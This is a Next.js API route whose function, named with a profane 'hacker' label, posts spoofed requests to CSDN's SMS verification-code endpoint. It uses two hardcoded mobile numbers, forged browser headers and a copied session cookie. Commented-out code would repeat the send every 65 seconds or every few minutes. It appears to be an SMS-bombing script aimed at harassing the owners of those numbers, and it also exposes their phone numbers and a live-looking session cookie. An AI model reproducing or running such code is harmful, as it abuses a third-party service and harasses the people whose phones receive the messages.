import { NextResponse } from 'next/server';

declare const global: { task: any };

export const revalidate = 0;

async function hackFucker() {
    const mobile = Date.now() % 2 === 0 ? '18610831322' : '13681249122';
    console.log('Hacker Fucker:', mobile, new Date().toLocaleString('zh-Hans-CN', { timeZone: 'Asia/Shanghai' }));
    return await fetch('https://passport.csdn.net/v1/register/pc/sendVerifyCode', {
        method: 'POST',
        cache: 'no-cache',
        headers: {
            'Content-Type': 'application/json;charset=UTF-8',
            Origin: 'https://passport.csdn.net',
            Referer: 'https://passport.csdn.net/login?code=applets',
            'User-Agent':
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            Cookie: 'uuid_tt_dd=10_17360252820-1640055186131-987885; Hm_up_6bcd52f51e9b3dce32bec4a3997715ac=%7B%22islogin%22%3A%7B%22value%22%3A%220%22%2C%22scope%22%3A1%7D%2C%22isonline%22%3A%7B%22value%22%3A%220%22%2C%22scope%22%3A1%7D%2C%22isvip%22%3A%7B%22value%22%3A%220%22%2C%22scope%22%3A1%7D%7D; Hm_ct_6bcd52f51e9b3dce32bec4a3997715ac=6525*1*10_17360252820-1640055186131-987885; _ga_VHSCGE70LW=GS1.1.1641348626.2.0.1641348626.0; __bid_n=1841833cc7947304654207; c_segment=13; dc_sid=96e741788509bdf2109ddb8132b42e69; FEID=v10-230c48914a212fee8a4b7d21cd3255ac9c3d0ab0; __xaf_fpstarttimer__=1672286665485; __xaf_thstime__=1672286665759; __xaf_fptokentimer__=1672286665889; ssxmod_itna=WqAxgDRDBD2DumDzr7rK0KpwEKQ0=YtseF3FDl2QexA5D8D6DQeGTr2e3D0ehjw70tPsionhpeMW=Coppq/h3yG+27AnbeD=xYQDwxYoDUxGtDpxG6orDeW=D5xGoDPxDeDAiK18MmV4GdD0+sIEKzDYPDEB5DRxi8DQ5zDicFQ4DWExi1r85C=9PD0ZRwsggPejqhDlmAv=9C9rDGQAY30x0kg40OE1FhxIyzfPQG3SqxAGioZjieqARK37GftmfNrh05C00taB0tMB0YeeUx8cTPMGoYrAUDD=; ssxmod_itna2=WqAxgDRDBD2DumDzr7rK0KpwEKQ0=YtseF3D61t8D05+hq03qH2LjQQ2e2CjlYSrDvQGDG2aizQK0STXzH7EYI2z37au3TFRDn+tsxZKeqU7Gwzt=AchVjUjW1zpczlGz0uMp3ITDQKbDjKD+OmDD===; FPTOKEN=q0u/4PspzP008saxoYal8GJH8uSM/XEcUUWCl4db4bzWSsSjdBqWw5nxYm/1G75UOd9DzQ6Ptbw597fVkXPctozh3Tj+6XU30YRYXNCWDaI5fQFSBfJ6vhIXb6oR/l6Qza8GkImjFVgGKVHT9eGPZMmJzMEDIHveZd5/BnTEPdqhbr/zwM5b7nJ9ClaMR3VvjVaIz4B22LEWyi3/b/D+MugDHzrsOYF0sTPMPP1/duEEl09hvHz9c5W2dWrBDS2tHbVLlG8S9qR85cE5D0j2GqqSOwbEkLn28f7FcfClWuSqbgvSLtaKtlcV/zTuWpB6lbU0c3PUE+zffytsHn2ts4LrcwWPDrQ21v1UD+O2yF8nhUFaizUSVL9+uPd9zsH6hgdoaxbdoeOdmQgU1pexZA==|uODYu6zeGEOhrCSiCQ99Ci8FBEQ5R1S8O1LMZfZw/BE=|10|a5a5d5e393bad6aa983c694d978c903b; https_waf_cookie=115c44f2-fe10-4d4a22fc66c290f31d896ae1d30e3b667acb; log_Id_view=524; Hm_lvt_6bcd52f51e9b3dce32bec4a3997715ac=1690949736; __gads=ID=45cc45f23b903cd3-2255b6e250d90066:T=1673857948:RT=1691143727:S=ALNI_MYjjiPWuVMSONSoAY72gk38Gvit9A; __gpi=UID=00000c2626bb3c14:T=1690949737:RT=1691143727:S=ALNI_MZLtCoXC8tXndYAsz6vZipXtXklmQ; FCCDCF=%5Bnull%2Cnull%2Cnull%2Cnull%2C%5B%5B1691143728%2C486000000%5D%2C%221YNN%22%5D%2Cnull%2C%5B%5D%5D; FCNEC=%5B%5B%22AKsRol_obJZdvi1eQE0zFp5UjlEyDnEAHUvu5V6UxwUqwCd4cOV8ENIAZtiHtNF640ofvn86UbCqqguOiIJbu8kXgaDLTOoNKPrjVsZzkmqX_whLdGDhtCPFlM1KADhFK4vFx--QmaabA1BJqwab_aiOdPbPFTHrMA%3D%3D%22%5D%2Cnull%2C%5B%5D%5D; c_dl_fref=https://blog.csdn.net/JAVA_YU_XIN/article/details/108754235; c_dl_prid=1691143748858_461461; c_dl_rid=1691143760134_504275; c_dl_fpage=/download/weixin_39840515/11452845; c_dl_um=distribute.pc_relevant.none-task-download-2%7Edefault%7ECTRLIST%7ERate-9-16298367-blog-108754235.235%5Ev38%5Epc_relevant_sort_base2; dc_session_id=10_1692168046102.368251; c_pref=https%3A//blog.csdn.net/JAVA_YU_XIN/article/details/108754235; c_ref=https%3A//www.google.com/; c_first_ref=www.google.com; c_first_page=https%3A//www.csdn.net/; c_dsid=11_1692168046845.127927; c_page_id=default; log_Id_pv=121; hide_login=1; Hm_lpvt_6bcd52f51e9b3dce32bec4a3997715ac=1692168048; loginbox_strategy=%7B%22taskId%22%3A270%2C%22abCheckTime%22%3A1692168047831%2C%22version%22%3A%22notInDomain%22%2C%22blog-sixH-default%22%3A1691143421074%7D; _ga_JJBD2VG1H7=GS1.1.1692168049.1.0.1692168049.60.0.0; _ga=GA1.2.1715119444.1641277837; _gid=GA1.2.1122184324.1692168050; log_Id_click=89; SESSION=13ea2a16-80b5-4817-9048-39f9b737f8a7; dc_tos=rzh1hl'
        },
        body: `{"mobile":${mobile},"type":"0","code":"0086"}`
    })
        .then(res => {
            console.log('Hacker->OK', res.status);
            if (res.status === 521) {
                res.text().then(text => console.log('Hacker', text));
            }
            return res.json();
        })
        .catch(reason => {
            return { code: 505, message: reason.message }
        })
        .then(({ code, message, track = '' }) => {
            console.log(code, message);
            // global['task'] = setTimeout(
            //     () => {
            //         console.log('AGAIN SEND SMS');
            //         hackFucker();
            //     },
            //     code === '1029' ? 5 * 60 * 1000 : 65 * 1000
            // );
            return { code, message, mobile, track };
        });
}

export async function GET(request: Request) {
    // clearTimeout(global['task']);
    const { code, message, mobile } = await hackFucker();
    return NextResponse.json({ code, msg: message, mobile });
}
